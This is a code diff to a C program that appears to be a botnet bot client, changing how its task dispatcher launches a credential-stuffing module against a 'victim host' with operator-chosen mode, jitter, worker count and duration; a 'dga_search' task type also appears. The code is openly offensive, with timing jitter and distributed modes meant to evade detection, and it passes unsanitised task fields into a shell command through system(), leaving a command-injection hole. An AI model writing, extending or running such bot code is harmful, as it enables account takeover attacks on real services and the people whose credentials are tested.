@@ -466,12 +466,49 @@ static void dispatch_task(const char *task_json) {
         pthread_detach(t);
 
     } else if (strcmp(type, "cred_stuffing") == 0) {
-        /* Delegate to Python cred_stuffing module */
-        char cmd[256];
-        snprintf(cmd, sizeof(cmd),
-                 "python3 cred_stuffing.py --mode bot --host %s --port %d &",
-                 target_ip, port);
-        printf("[BOT] Spawning credential stuffing module\n");
+        /*
+         * Delegate to cred_stuffing.py, forwarding all task fields
+         * so the operator's mode/jitter/workers choices are respected.
+         *
+         * Fields parsed from task JSON:
+         *   target_ip   — victim host  (default 192.168.100.20)
+         *   target_port — HTTP port    (default 80)
+         *   duration    — seconds      (default 120, passed as shell timeout)
+         *   mode        — "bot"|"jitter"|"distributed"  (default "jitter")
+         *   jitter      — int ms       (default 200)
+         *   workers     — int threads  (default 3, distributed mode only)
+         */
+        char mode[32]    = "jitter";
+        int  jitter_ms   = 200;
+        int  workers     = 3;
+        int  dur         = json_int_field(task_json, "duration", 120);
+
+        /* Extract mode string */
+        json_str_field(task_json, "mode", mode, sizeof(mode));
+
+        /* Extract optional int fields */
+        const char *jp = strstr(task_json, "\"jitter\":");
+        if (jp) jitter_ms = atoi(jp + 9);
+        const char *wp = strstr(task_json, "\"workers\":");
+        if (wp) workers = atoi(wp + 10);
+
+        char cmd[512];
+        if (strcmp(mode, "distributed") == 0) {
+            snprintf(cmd, sizeof(cmd),
+                     "timeout %d python3 cred_stuffing.py"
+                     " --mode distributed"
+                     " --host %s --port %d"
+                     " --workers %d &",
+                     dur, target_ip, port, workers);
+        } else {
+            snprintf(cmd, sizeof(cmd),
+                     "timeout %d python3 cred_stuffing.py"
+                     " --mode %s"
+                     " --host %s --port %d"
+                     " --interval 500 --jitter %d &",
+                     dur, mode, target_ip, port, jitter_ms);
+        }
+        printf("[BOT] Spawning credential stuffing: %s\n", cmd);
         system(cmd);
 
     } else if (strcmp(type, "dga_search") == 0) {
